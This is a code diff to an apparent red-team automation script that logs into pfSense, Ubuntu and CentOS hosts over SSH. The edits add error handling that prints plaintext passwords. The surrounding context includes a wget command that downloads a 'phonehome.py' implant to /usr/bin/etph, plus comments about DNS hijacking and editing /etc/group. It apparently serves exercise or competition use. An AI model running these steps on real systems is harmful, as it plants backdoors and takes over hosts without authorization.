@@ -78,7 +78,12 @@ def get_ssh_pub():
 
 def pfsense_attacks(host):
     ssh = pxssh.pxssh()
-    ssh.login(host.ip, host.username, password=host.password)
+    try:
+        ssh.login(host.ip, host.username, password=host.password)
+    except Exception as e:
+        print(str(e))
+        print("Error on host {} with ip {} using username {} and password \"{}\"".format(host.name, host.ip, host.username, host.password))
+
     ssh.sendline('8')
      ## Chown phone home
     #
@@ -94,8 +99,11 @@ def universal_linux_attack(host):
     print("Creating SSH session on {}.".format(host.ip))
     # Create SSH session
     ssh = pxssh.pxssh()
-    ssh.login(host.ip, host.username, password=host.password)
-
+    try:
+        ssh.login(host.ip, host.username, password=host.password)
+    except Exception as e:
+        print(str(e))
+        print("Error on host {} with ip {} using username {} and password \"{}\"".format(host.name, host.ip, host.username, host.password))
     ssh.sendline('/bin/true')
     ssh.prompt()
     
@@ -212,7 +220,12 @@ def ubuntu_attacks(host):
     # Replace upstream DNS with red team villainy
     # sudo update-rc.d bind disable
     ssh = pxssh.pxssh()
-    ssh.login(host.ip, host.username, password=host.password)
+
+    try:
+        ssh.login(host.ip, host.username, password=host.password)
+    except Exception as e:
+        print(str(e))
+        print("Error on host {} with ip {} using username {} and password \"{}\"".format(host.name, host.ip, host.username, host.password))
 
      # ez mode /etc/group
     wget_phonehome_cmd = "wget {}/phonehome.py -O /usr/bin/etph" 
@@ -284,7 +297,12 @@ def ubuntu_attacks(host):
 def centos_attacks(host):
     server_ip = "10.0.0.101"
     ssh = pxssh.pxssh()
-    ssh.login(host.ip, host.username, password=host.password)
+    
+    try:
+        ssh.login(host.ip, host.username, password=host.password)
+    except Exception as e:
+        print(str(e))
+        print("Error on host {} with ip {} using username {} and password \"{}\"".format(host.name, host.ip, host.username, host.password))
     # sudo update-rc.d httpd disable
     # lol
          # ez mode /etc/group
